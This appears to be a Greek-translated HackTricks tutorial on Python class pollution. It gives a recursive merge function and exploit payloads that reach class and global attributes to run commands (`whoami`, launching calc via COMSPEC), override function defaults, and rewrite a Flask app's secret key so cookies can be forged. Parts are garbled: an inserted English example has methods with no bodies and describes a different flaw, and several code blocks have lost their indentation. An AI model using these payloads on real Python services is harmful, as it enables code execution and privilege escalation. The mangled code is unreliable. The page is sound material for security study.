# Class Pollution (Python's Prototype Pollution)

<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

## Βασικό Παράδειγμα

Ελέγξτε πώς είναι δυνατόν να ρυπάνετε τις κλάσεις αντικειμένων με αλφαριθμητικά:

```python
class Company: pass
class Developer(Company): pass
class Entity(Developer): pass

c = Company()
d = Developer()
e = Entity()

print(c) #<__main__.Company object at 0x1043a72b0>
print(d) #<__main__.Developer object at 0x1041d2b80>
print(e) #<__main__.Entity object at 0x1041d2730>

e.__class__.__qualname__ = 'Polluted_Entity'

print(e) #<__main__.Polluted_Entity object at 0x1041d2730>

e.__class__.__base__.__qualname__ = 'Polluted_Developer'
e.__class__.__base__.__base__.__qualname__ = 'Polluted_Company'

print(d) #<__main__.Polluted_Developer object at 0x1041d2b80>
print(c) #<__main__.Polluted_Company object at 0x1043a72b0>
```

## Βασικό παράδειγμα ευπάθειας

Consider the following Python code:

```python
class User:
    def __init__(self, username, password):
        self.username = username
        self.password = password

    def login(self):
        # Code for user login

    def logout(self):
        # Code for user logout

class Admin(User):
    def __init__(self, username, password):
        super().__init__(username, password)

    def promote_user(self, user):
        # Code for promoting a user to admin

    def delete_user(self, user):
        # Code for deleting a user

# Creating a user object
user = User("john", "password123")

# Logging in as a user
user.login()

# Creating an admin object
admin = Admin("admin", "admin123")

# Promoting the user to admin
admin.promote_user(user)

# Deleting the user
admin.delete_user(user)
```

In this example, we have a basic implementation of a User class and an Admin class that inherits from the User class. The User class has methods for login and logout, while the Admin class has additional methods for promoting a user to admin and deleting a user.

However, there is a vulnerability in this code due to the lack of proper input validation. Specifically, the `promote_user` and `delete_user` methods do not check if the user being operated on is actually a User object. This means that any object can be passed as an argument to these methods, potentially leading to unauthorized access or unintended consequences.

To mitigate this vulnerability, it is important to add input validation to ensure that only User objects can be promoted or deleted by the Admin class. This can be done by checking the type of the object before performing any operations on it.

```python
class Admin(User):
    def __init__(self, username, password):
        super().__init__(username, password)

    def promote_user(self, user):
        if isinstance(user, User):
            # Code for promoting a user to admin
        else:
            raise ValueError("Invalid user object")

    def delete_user(self, user):
        if isinstance(user, User):
            # Code for deleting a user
        else:
            raise ValueError("Invalid user object")
```

By adding this input validation, we ensure that only User objects can be promoted or deleted by the Admin class, reducing the risk of unauthorized access or unintended consequences.

```python
# Initial state
class Employee: pass
emp = Employee()
print(vars(emp)) #{}

# Vulenrable function
def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)


USER_INPUT = {
"name":"Ahemd",
"age": 23,
"manager":{
"name":"Sarah"
}
}

merge(USER_INPUT, emp)
print(vars(emp)) #{'name': 'Ahemd', 'age': 23, 'manager': {'name': 'Sarah'}}
```

## Παραδείγματα Gadget

<details>

<summary>Δημιουργία προεπιλεγμένης τιμής ιδιότητας κλάσης για RCE (subprocess)</summary>

\`\`\`python from os import popen class Employee: pass # Creating an empty class class HR(Employee): pass # Class inherits from Employee class class Recruiter(HR): pass # Class inherits from HR class

class SystemAdmin(Employee): # Class inherits from Employee class def execute\_command(self): command = self.custom\_command if hasattr(self, 'custom\_command') else 'echo Hello there' return f'\[!] Executing: "{command}", output: "{popen(command).read().strip()}"'

def merge(src, dst):

## Recursive merge function

for k, v in src.items(): if hasattr(dst, '**getitem**'): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst\[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v)

USER\_INPUT = { "**class**":{ "**base**":{ "**base**":{ "custom\_command": "whoami" } } } }

recruiter\_emp = Recruiter() system\_admin\_emp = SystemAdmin()

print(system\_admin\_emp.execute\_command()) #> \[!] Executing: "echo Hello there", output: "Hello there"

## Create default value for Employee.custom\_command

merge(USER\_INPUT, recruiter\_emp)

print(system\_admin\_emp.execute\_command()) #> \[!] Executing: "whoami", output: "abdulrah33m"

````
</details>

<details>

<summary>Ρύπανση άλλων κλάσεων και παγκόσμιων μεταβλητών μέσω της <code>globals</code></summary>
```python
def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)

class User:
def __init__(self):
pass

class NotAccessibleClass: pass

not_accessible_variable = 'Hello'

merge({'__class__':{'__init__':{'__globals__':{'not_accessible_variable':'Polluted variable','NotAccessibleClass':{'__qualname__':'PollutedClass'}}}}}, User())

print(not_accessible_variable) #> Polluted variable
print(NotAccessibleClass) #> <class '__main__.PollutedClass'>
````

</details>

<details>

<summary>Αυθαίρετη εκτέλεση υποδιεργασιών</summary>

\`\`\`python import subprocess, json

class Employee: def **init**(self): pass

def merge(src, dst):

## Recursive merge function

for k, v in src.items(): if hasattr(dst, '**getitem**'): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst\[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v)

## Overwrite env var "COMSPEC" to execute a calc

USER\_INPUT = json.loads('{"**init**":{"**globals**":{"subprocess":{"os":{"environ":{"COMSPEC":"cmd /c calc"\}}\}}\}}') # attacker-controlled value

merge(USER\_INPUT, Employee())

subprocess.Popen('whoami', shell=True) # Calc.exe will pop up

````
</details>

<details>

<summary>Αντικατάσταση του <strong><code>__kwdefaults__</code></strong></summary>

**`__kwdefaults__`** είναι ένα ειδικό χαρακτηριστικό όλων των συναρτήσεων, βάσει της [τεκμηρίωσης](https://docs.python.org/3/library/inspect.html) της Python, είναι ένα "χαρτογράφημα των προεπιλεγμένων τιμών για τις παραμέτρους μόνο με λέξεις-κλειδιά". Η αλλοίωση αυτού του χαρακτηριστικού μας επιτρέπει να ελέγχουμε τις προεπιλεγμένες τιμές των παραμέτρων μόνο με λέξεις-κλειδιά μιας συνάρτησης, αυτές είναι οι παράμετροι της συνάρτησης που ακολουθούν μετά το \* ή \*args.
```python
from os import system
import json

def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)

class Employee:
def __init__(self):
pass

def execute(*, command='whoami'):
print(f'Executing {command}')
system(command)

print(execute.__kwdefaults__) #> {'command': 'whoami'}
execute() #> Executing whoami
#> user

emp_info = json.loads('{"__class__":{"__init__":{"__globals__":{"execute":{"__kwdefaults__":{"command":"echo Polluted"}}}}}}') # attacker-controlled value
merge(emp_info, Employee())

print(execute.__kwdefaults__) #> {'command': 'echo Polluted'}
execute() #> Executing echo Polluted
#> Polluted
````

</details>

<details>

<summary>Αντικατάσταση του μυστικού του Flask σε διάφορα αρχεία</summary>

Έτσι, αν μπορείτε να κάνετε μια κλασική ρύπανση πάνω σε ένα αντικείμενο που έχει οριστεί στο κύριο αρχείο Python της ιστοσελίδας, **της οποίας η κλάση έχει οριστεί σε διαφορετικό αρχείο** από το κύριο. Επειδή για να έχετε πρόσβαση στο \_\_globals\_\_ στις προηγούμενες επιθέσεις, πρέπει να έχετε πρόσβαση στην κλάση του αντικειμένου ή στις μεθόδους της κλάσης, θα μπορείτε να **έχετε πρόσβαση στα globals σε αυτό το αρχείο, αλλά όχι στο κύριο**.\
Συνεπώς, **δεν θα μπορείτε να έχετε πρόσβαση στο αντικείμενο Flask app global** που ορίζει το **κλειδί του μυστικού** στην κύρια σελίδα:

```python
app = Flask(__name__, template_folder='templates')
app.secret_key = '(:secret:)'
```

Σε αυτό το σενάριο χρειάζεστε ένα εργαλείο για να περιηγηθείτε στα αρχεία για να φτάσετε στο κύριο αρχείο και να **αποκτήσετε πρόσβαση στον παγκόσμιο αντικείμενο `app.secret_key`** για να αλλάξετε το μυστικό κλειδί του Flask και να είστε σε θέση να [**αναβαθμίσετε τα δικαιώματα** γνωρίζοντας αυτό το κλειδί](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign).

Ένα πακέτο όπως αυτό [από αυτήν την ανάλυση](https://ctftime.org/writeup/36082):

{% code overflow="wrap" %}
```python
__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key
```
{% endcode %}

Χρησιμοποιήστε αυτό το payload για να **αλλάξετε το `app.secret_key`** (το όνομα στην εφαρμογή σας μπορεί να είναι διαφορετικό) για να μπορείτε να υπογράφετε νέα και πιο προνόμια cookies του flask.

</details>

Ελέγξτε επίσης την παρακάτω σελίδα για περισσότερα gadgets μόνο για ανάγνωση:

{% content-ref url="python-internal-read-gadgets.md" %}
[python-internal-read-gadgets.md](python-internal-read-gadgets.md)
{% endcontent-ref %}

## Αναφορές

* [https://blog.abdulrah33m.com/prototype-pollution-in-python/](https://blog.abdulrah33m.com/prototype-pollution-in-python/)

<details>

<summary><strong>Μάθετε το hacking στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα hacking tricks σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
